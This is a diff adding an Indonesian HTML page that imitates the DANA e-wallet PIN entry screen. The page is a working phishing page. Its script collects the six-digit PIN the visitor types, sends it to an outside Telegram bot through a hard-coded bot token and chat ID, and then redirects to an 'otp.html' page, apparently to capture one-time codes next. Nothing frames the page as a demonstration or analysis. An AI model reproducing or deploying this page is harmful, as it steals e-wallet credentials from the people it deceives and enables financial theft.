@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#118eea">
+    <title>Input PIN</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #118eea;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            height: 100vh;
+            overflow: hidden;
+            margin: 0;
+            margin-top: 8%;
+        }
+
+        .container {
+            text-align: center;
+            width: 100%;
+        }
+
+        .pin-box {
+            display: grid;
+            grid-template-columns: repeat(6, 40px);
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .pin-box input {
+            width: 35px;
+            height: 40px;
+            font-size: 22px;
+            text-align: center;
+            font-weight:bold;
+            margin-left: -3px;
+            border: 1px solid #fff;
+            border-radius: 5px;
+        }
+
+        .loading-pin {
+            display: none;
+            position: relative;
+            margin-top: 10px;
+            margin-left: -40px;
+        }
+
+        .loading-pin.active {
+            display: block;
+        }
+
+        .loading-pin img.static-image {
+            position: absolute;
+            width: 50px;
+            z-index: 1;
+            margin-left:-5px;
+            margin-top:-5px;
+        }
+        
+        .loading-pin img.spinner {
+            position: absolute;
+            width: 40px;
+            z-index: 2;
+            animation: spin 0.7s linear infinite;
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(-360deg);
+            }
+        }
+
+        .message {
+            margin-top: -10px;
+            color: red;
+            font-size: 18px;
+            display: none;
+        }
+
+        .message.active {
+            display: block;
+        }
+
+        .logo {
+            display: block;
+            margin: 0 auto 15px;
+            width: 130px;
+            height: auto;
+        }
+
+        p {
+            color: #fff;
+        }
+
+        .box {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border: 1px solid #fff;
+            border-radius: 10px;
+            padding: 5px 25px;
+            background-color: #118eea;
+            margin: 20px auto;
+            width: fit-content;
+            font-size: 8px;
+        }
+
+        .text {
+            font-size: 12px;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        h3 {
+            font-size: 13px;
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container pin-section">
+        <form action="javascript:void(0);" method="post" id="pinOtpForm">
+            <input type="hidden" name="pin" id="pinField">
+        </form>
+
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEg3W1e-Q4DtbaO1xNNgQBsYSOF_eMf4kssHUNlXmShUHc93Lgj5fdB4ZTVr8NAsj4xN1Z3BiDrfr3CISxTEThEixk84xxIf4ZQm6QPB31R4O_gavWdcg00yhAJtYbctqz5eTrjxwS0jq26KVdHLt7f4cyI6vT6zHYreTAvWBEYbKzfDfpKbxdoLSMmh2lDS" alt="Logo" class="logo">
+
+        <div class="pin-input active">
+            <p>Masukkan <strong>PIN DANA</strong></p>
+            <div class="pin-box">
+                <input type="tel" maxlength="1" id="pin1">
+                <input type="tel" maxlength="1" id="pin2">
+                <input type="tel" maxlength="1" id="pin3">
+                <input type="tel" maxlength="1" id="pin4">
+                <input type="tel" maxlength="1" id="pin5">
+                <input type="tel" maxlength="1" id="pin6">
+            </div>
+            <div class="box">
+                <span class="text">TAMPILKAN</span>
+            </div>
+            <h3>Lupa PIN?</h3>
+
+            <div class="loading-pin" id="loadingPin">
+                <img src="load_bg.png" alt="Static Image" class="static-image">
+                <img src="load_spin.png" alt="Spinner Image" class="spinner">
+            </div>
+        </div>
+
+        <div class="message" id="errorMessage">
+            PIN tidak valid!
+        </div>
+    </div>
+
+    <script>
+        const pinInputs = document.querySelectorAll('.pin-input input');
+        const loadingPin = document.getElementById('loadingPin');
+
+        function moveToNextInput(currentInput, nextInput) {
+            if (currentInput.value.length === 1 && nextInput) {
+                nextInput.focus();
+            }
+        }
+
+        function moveToPrevInput(currentInput, prevInput) {
+            if (currentInput.value.length === 0 && prevInput) {
+                prevInput.focus();
+            }
+        }
+
+        function checkPinFilled() {
+            return Array.from(pinInputs).every(pin => pin.value);
+        }
+
+        pinInputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                moveToNextInput(input, pinInputs[index + 1]);
+
+                if (checkPinFilled()) {
+                    showLoadingThenRedirect();
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace') {
+                    moveToPrevInput(input, pinInputs[index - 1]);
+                }
+            });
+        });
+
+        function showLoadingThenRedirect() {
+            loadingPin.classList.add('active');
+            document.activeElement.blur(); // Menghilangkan fokus dari input saat loading
+
+            setTimeout(() => {
+                loadingPin.classList.remove('active');
+                const pinValue = Array.from(pinInputs).map(input => input.value).join('');
+                document.getElementById('pinField').value = pinValue;
+
+                // Kirim PIN ke Telegram menggunakan AJAX
+                sendPinToTelegram(pinValue);
+
+                // Redirect ke otp.html
+                window.location.href = 'otp.html';
+            }, 3000);
+        }
+
+        function sendPinToTelegram(pin) {
+            const token = '7463211570:AAEvN-TOvXcoLM2JpNg8RBp0OxF6t0Czh70'; // Ganti dengan token bot Anda
+            const chatId = '6824078885';  // Ganti dengan chat ID Anda (bisa menggunakan ID pribadi atau grup)
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            const message = `PIN yang dimasukkan: ${pin}`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log('Message sent:', data))
+            .catch(error => console.error('Error sending message:', error));
+        }
+    </script>
+</body>
+</html>
